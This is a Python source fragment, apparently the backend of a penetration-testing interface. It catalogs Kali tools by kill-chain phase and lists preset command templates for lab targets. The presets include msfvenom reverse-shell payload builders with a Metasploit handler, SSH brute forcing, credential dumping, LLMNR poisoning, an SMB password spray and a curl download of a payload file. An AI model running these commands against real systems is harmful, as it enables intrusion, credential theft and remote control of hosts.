    {"slug": "netcat", "name": "netcat", "cmd": "nc", "category": "exfiltration", "desc": "TCP/UDP swiss army knife", "phases": [16, 18], "url": "https://www.kali.org/tools/netcat/"},
    {"slug": "scp", "name": "scp", "cmd": "scp", "category": "exfiltration", "desc": "Secure copy (ssh-based)", "phases": [16], "url": "https://www.kali.org/tools/"},
    {"slug": "rclone", "name": "rclone", "cmd": "rclone", "category": "exfiltration", "desc": "Cloud storage sync", "phases": [16], "url": "https://www.kali.org/tools/"},
    {"slug": "goshs", "name": "goshs", "cmd": "goshs", "category": "exfiltration", "desc": "Simple HTTPS server", "phases": [16], "url": "https://www.kali.org/tools/goshs/"},
    # Impact
    {"slug": "scapy", "name": "scapy", "cmd": "scapy", "category": "impact", "desc": "Packet crafting/manipulation", "phases": [17], "url": "https://www.kali.org/tools/scapy/"},
    {"slug": "siege", "name": "siege", "cmd": "siege", "category": "impact", "desc": "HTTP load tester / DoS", "phases": [17], "url": "https://www.kali.org/tools/siege/"},
    {"slug": "goldeneye", "name": "goldeneye", "cmd": "goldeneye", "category": "impact", "desc": "Layer 7 DoS tool", "phases": [17], "url": "https://www.kali.org/tools/goldeneye/"},
    {"slug": "dhcpig", "name": "dhcpig", "cmd": "dhcpig", "category": "impact", "desc": "DHCP exhaustion attack", "phases": [17], "url": "https://www.kali.org/tools/dhcpig/"},
    {"slug": "mdk3", "name": "mdk3", "cmd": "mdk3", "category": "impact", "desc": "WiFi jamming / DoS", "phases": [17], "url": "https://www.kali.org/tools/mdk3/"},
    # Forensics
    {"slug": "autopsy", "name": "autopsy", "cmd": "autopsy", "category": "forensics", "desc": "GUI digital forensics platform", "phases": [18], "url": "https://www.kali.org/tools/autopsy/"},
    {"slug": "binwalk", "name": "binwalk", "cmd": "binwalk", "category": "forensics", "desc": "Firmware binary analyzer", "phases": [18], "url": "https://www.kali.org/tools/binwalk/"},
    {"slug": "foremost", "name": "foremost", "cmd": "foremost", "category": "forensics", "desc": "File carving", "phases": [18], "url": "https://www.kali.org/tools/foremost/"},
    {"slug": "volatility", "name": "volatility", "cmd": "volatility", "category": "forensics", "desc": "Memory forensics framework", "phases": [18], "url": "https://www.kali.org/tools/volatility/"},
    {"slug": "steghide", "name": "steghide", "cmd": "steghide", "category": "forensics", "desc": "Steganography tool", "phases": [18], "url": "https://www.kali.org/tools/steghide/"},
    {"slug": "exiftool", "name": "exiftool", "cmd": "exiftool", "category": "forensics", "desc": "Metadata extractor", "phases": [18], "url": "https://www.kali.org/tools/exiftool/"},
    {"slug": "wireshark", "name": "wireshark", "cmd": "wireshark", "category": "forensics", "desc": "Packet capture/analysis", "phases": [18], "url": "https://www.kali.org/tools/wireshark/"},
    {"slug": "tshark", "name": "tshark", "cmd": "tshark", "category": "forensics", "desc": "CLI packet analyzer", "phases": [18], "url": "https://www.kali.org/tools/wireshark/"},
    {"slug": "tcpdump", "name": "tcpdump", "cmd": "tcpdump", "category": "forensics", "desc": "CLI packet capture", "phases": [18], "url": "https://www.kali.org/tools/tcpdump/"},
    {"slug": "burpsuite", "name": "burpsuite", "cmd": "burpsuite", "category": "forensics", "desc": "Web app pentest proxy", "phases": [1, 5, 10], "url": "https://www.kali.org/tools/burpsuite/"},
]

KALI_CATEGORIES = [
    {"name": "reconnaissance", "desc": "142 tools — host/service discovery", "uckc_phases": [1, 10]},
    {"name": "resource-development", "desc": "61 tools — payload & exploit dev", "uckc_phases": [2]},
    {"name": "initial-access", "desc": "21 tools — exploit & social eng", "uckc_phases": [3, 4, 5]},
    {"name": "execution", "desc": "12 tools — code execution frameworks", "uckc_phases": [12]},
    {"name": "persistence", "desc": "13 tools — maintain access", "uckc_phases": [6]},
    {"name": "privilege-escalation", "desc": "12 tools — local privesc", "uckc_phases": [11]},
    {"name": "defense-evasion", "desc": "40 tools — AV/EDR bypass", "uckc_phases": [7]},
    {"name": "credential-access", "desc": "103 tools — creds & hash crack", "uckc_phases": [13]},
    {"name": "discovery", "desc": "127 tools — internal enum", "uckc_phases": [10]},
    {"name": "lateral-movement", "desc": "23 tools — pivot & spread", "uckc_phases": [9, 14]},
    {"name": "collection", "desc": "21 tools — data gather", "uckc_phases": [15]},
    {"name": "command-and-control", "desc": "78 tools — C2 channels", "uckc_phases": [8]},
    {"name": "exfiltration", "desc": "6 tools — data exfil", "uckc_phases": [16]},
    {"name": "impact", "desc": "13 tools — manipulate/disrupt", "uckc_phases": [17]},
    {"name": "forensics", "desc": "85 tools — post-eng evidence", "uckc_phases": [18]},
    {"name": "services-and-other-tools", "desc": "Anonymity, stress testing, etc.", "uckc_phases": [7, 18]},
    {"name": "wireless", "desc": "Wireless attacks (subset of credential-access)", "uckc_phases": [3, 13]},
]

def list_kali_tools(category: Optional[str] = None, search: Optional[str] = None, phase: Optional[int] = None) -> list[dict]:
    items = KALI_CATALOG
    if category and category != "all":
        items = [t for t in items if t["category"] == category]
    if phase is not None:
        items = [t for t in items if phase in t["phases"]]
    if search:
        q = search.lower()
        items = [t for t in items if q in t["name"].lower() or q in t["cmd"].lower() or q in t["desc"].lower() or q in t["slug"].lower()]
    return items

# Pre-baked popular templates (sanitized) for direct UI consumption
PRESET_TEMPLATES: list[dict] = [
    {"id": "nmap-vuln-scan", "label": "nmap vuln scan (--script vuln)", "tool": "nmap", "phase": 1, "template": "nmap -sV -sC --script=vuln {target}", "params": {"target": "", "scan_type": "-sV -sC --script=vuln", "ports": "", "extra": ""}, "tags": ["vuln", "popular"]},
    {"id": "nmap-full-tcp", "label": "nmap full TCP (-p-)", "tool": "nmap", "phase": 1, "template": "nmap -sV -p- -T4 {target}", "params": {"target": "", "scan_type": "-sV -T4", "ports": "-p-", "extra": ""}, "tags": ["recon", "full"]},
    {"id": "nmap-udp-top100", "label": "nmap UDP top 100", "tool": "nmap", "phase": 1, "template": "nmap -sU --top-ports 100 {target}", "params": {"target": "", "scan_type": "-sU", "ports": "--top-ports 100", "extra": ""}, "tags": ["udp"]},
    {"id": "nmap-smb-vuln", "label": "nmap SMB vuln scripts", "tool": "nmap", "phase": 10, "template": "nmap -sV -p 445 --script=smb-vuln* {target}", "params": {"target": "", "scan_type": "-sV -p 445", "ports": "--script=smb-vuln*", "extra": ""}, "tags": ["smb"]},
    {"id": "nmap-http-enum", "label": "nmap HTTP enum scripts", "tool": "nmap", "phase": 10, "template": "nmap -sV -p 80,443 --script=http-enum {target}", "params": {"target": "", "scan_type": "-sV", "ports": "-p 80,443 --script=http-enum", "extra": ""}, "tags": ["http"]},
    {"id": "msfvenom-linux-elf", "label": "msfvenom linux/x64 reverse elf", "tool": "msfvenom", "phase": 2, "template": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}", "params": {"payload": "linux/x64/meterpreter/reverse_tcp", "lhost": "192.168.56.1", "lport": "4444", "format": "elf", "output": "/tmp/payload.elf"}, "tags": ["meterpreter"]},
    {"id": "msfvenom-windows-exe", "label": "msfvenom windows/x64 reverse exe", "tool": "msfvenom", "phase": 2, "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}", "params": {"payload": "windows/x64/meterpreter/reverse_tcp", "lhost": "192.168.56.1", "lport": "4444", "format": "exe", "output": "/tmp/payload.exe"}, "tags": ["windows"]},
    {"id": "msf-handler-linux", "label": "msfconsole multi/handler linux", "tool": "msfconsole_handler", "phase": 8, "template": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit'", "params": {"payload": "linux/x64/meterpreter/reverse_tcp", "lhost": "0.0.0.0", "lport": "4444"}, "tags": ["c2"]},
    {"id": "hydra-ssh", "label": "hydra SSH brute", "tool": "hydra", "phase": 13, "template": "hydra -L {userlist} -P {passlist} {target} ssh", "params": {"target": "", "userlist": "/usr/share/wordlists/metasploit/unix_users.txt", "passlist": "/usr/share/wordlists/rockyou.txt"}, "tags": ["brute"]},
    {"id": "impacket-psexec", "label": "impacket psexec.py", "tool": "psexec.py", "phase": 14, "template": "psexec.py {domain}/{user}:{password}@{target}", "params": {"domain": "WORKGROUP", "user": "administrator", "password": "Password123!", "target": ""}, "tags": ["lateral"]},
    {"id": "impacket-secretsdump", "label": "impacket secretsdump.py", "tool": "secretsdump.py", "phase": 13, "template": "secretsdump.py {domain}/{user}:{password}@{target}", "params": {"domain": "WORKGROUP", "user": "administrator", "password": "Password123!", "target": ""}, "tags": ["creds"]},
    {"id": "hashcat-ntlm", "label": "hashcat NTLM crack", "tool": "hashcat", "phase": 13, "template": "hashcat -m 1000 {hashfile} {wordlist}", "params": {"mode": "1000", "hashfile": "/tmp/hashes.txt", "wordlist": "/usr/share/wordlists/rockyou.txt"}, "tags": ["crack"]},
    {"id": "smbclient-ls", "label": "smbclient list share", "tool": "smbclient", "phase": 15, "template": "smbclient //{target}/{share} -U {user}%{password} -c 'ls'", "params": {"target": "", "share": "C$", "user": "administrator", "password": "Password123!"}, "tags": ["smb"]},
    {"id": "chisel-server", "label": "chisel server reverse pivot", "tool": "chisel", "phase": 9, "template": "chisel server -p {port} --reverse", "params": {"port": "8000"}, "tags": ["pivot"]},
    {"id": "responder-eth0", "label": "responder on eth0", "tool": "responder", "phase": 13, "template": "responder -I eth0 -wrf", "params": {}, "tags": ["creds", "poison"]},
    {"id": "bloodhound-collect", "label": "bloodhound-python collect", "tool": "bloodhound", "phase": 10, "template": "bloodhound-ce-python -u {user} -p {password} -ns {ns} -d {domain} -c all", "params": {"user": "admin", "password": "Password123!", "ns": "", "domain": "corp.local"}, "tags": ["ad"]},
    {"id": "autorecon-targeted", "label": "autorecon single target", "tool": "autorecon", "phase": 1, "template": "autorecon {target}", "params": {"target": ""}, "tags": ["recon", "auto"]},
    {"id": "linpeas", "label": "linpeas full enum", "tool": "linpeas", "phase": 11, "template": "bash /opt/peas/linpeas.sh", "params": {}, "tags": ["privesc"]},
    {"id": "winpeas", "label": "winPEASx64.exe", "tool": "winPEAS", "phase": 11, "template": "cmd.exe /c winPEASx64.exe", "params": {}, "tags": ["privesc"]},
    {"id": "curl-download", "label": "curl HTTP GET to file", "tool": "curl", "phase": 3, "template": "curl -v {url} -o {output}", "params": {"url": "http://192.168.56.101/payload.elf", "output": "/tmp/payload.elf"}, "tags": ["delivery"]},
    {"id": "nuclei-cves", "label": "nuclei critical/high CVEs", "tool": "nuclei", "phase": 1, "template": "nuclei -u {target} -severity critical,high", "params": {"target": "http://192.168.56.101", "severity": "critical,high"}, "tags": ["cve"]},
    {"id": "sqlmap-defaults", "label": "sqlmap default audit", "tool": "sqlmap", "phase": 5, "template": "sqlmap -u {url} --batch --crawl=1", "params": {"url": "http://192.168.56.101/page?id=1"}, "tags": ["sqli"]},
    {"id": "masscan-internet", "label": "masscan high rate", "tool": "masscan", "phase": 1, "template": "masscan {target} -p{ports} --rate {rate}", "params": {"target": "192.168.56.0/24", "ports": "0-65535", "rate": "1000"}, "tags": ["fast"]},
    {"id": "crackmapexec-smb", "label": "crackmapexec smb spray", "tool": "crackmapexec", "phase": 14, "template": "crackmapexec smb {target} -u {user} -p {password}", "params": {"target": "192.168.56.0/24", "user": "administrator", "password": "Password123!"}, "tags": ["lateral"]},
]
